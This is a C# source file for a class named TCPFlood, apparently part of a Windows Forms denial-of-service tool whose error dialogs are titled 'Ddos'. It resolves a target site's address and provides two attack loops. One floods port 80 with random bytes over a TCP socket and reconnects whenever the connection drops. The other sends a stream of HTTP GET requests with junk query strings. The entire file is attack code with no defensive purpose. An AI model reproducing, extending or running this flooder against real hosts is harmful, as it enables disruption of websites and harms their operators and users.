using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Text;
using System.Windows.Forms;
using System.Threading;


namespace TCP_Flood_Realization
{
    class TCPFlood
    {
        public static int exCount;
        private static bool _status = false;
        private string _host;
        private string _ip;
        private static Object thisLock = new Object();
        public TCPFlood(string URL)
        {
            exCount = 0;
            if (!checkURL(URL))
            {
                throw new Exception("Wrong URL");
            }
            else
            {
                _host = URL.Remove(0, 7); // Delete "http://" from URL string
                _ip = Dns.GetHostEntry(_host).AddressList[0].ToString();
            }
            
        }

       
        private bool checkURL(string url)
        {
            Uri siteUri = new Uri(url);
            try
            {
                HttpWebRequest myHttpWebRequest = (HttpWebRequest)WebRequest.Create(siteUri.GetLeftPart(UriPartial.Query));
                myHttpWebRequest.Timeout = 10000;

                HttpWebResponse myHttpWebResponse = (HttpWebResponse)myHttpWebRequest.GetResponse();
                if (myHttpWebResponse.StatusCode == HttpStatusCode.OK)
                    return true;
                myHttpWebResponse.Close();
            }
            catch (Exception)
            {
                return false;
            }
            return false;
        }

        public bool Status
        { 
            get 
            {
                return _status;
            }
            set
            {
                _status = value;
            }
        }

        public void Start()
        {
            Random random = new Random();
            TcpClient tcpClient = new TcpClient();
            Socket Sender = tcpClient.Client;
//            IPAddress IP = IPAddress.Parse(_ip);
//            Sender.Connect(_host, 80);
            Sender.Connect(_ip, 80);
            byte[] fake = new byte[1200];
            
            try
            {
                while (_status)
                {
                    //lock (thisLock) 
                    //{
                    
                    random.NextBytes(fake);
                    Sender.Send(fake);
                    
                    //}
                    
                    Thread.Sleep(random.Next(4000));
                    Thread.Sleep(7000);
                }
                Sender.Disconnect(true);
            }
            catch (SocketException sex)
            {
                if (sex.ErrorCode == 10053)
                {
                    GC.Collect();
                    exCount++;
                    Start();

                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "Ddos", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        public void StartGetAttack()
        {
            Random random = new Random();
            try
            {
                while (_status)
                {
                    //lock (thisLock) 
                    //{
                    byte[] fake = new byte[100];
                    random.NextBytes(fake);
                    
                    WebRequest req = System.Net.WebRequest.Create("http://"+_host + "?" + fake.ToString());
                    WebResponse resp = req.GetResponse();
                    //}
                    Thread.Sleep(random.Next(1000));
                }
               
            }
            
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "Ddos", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        
    }

}
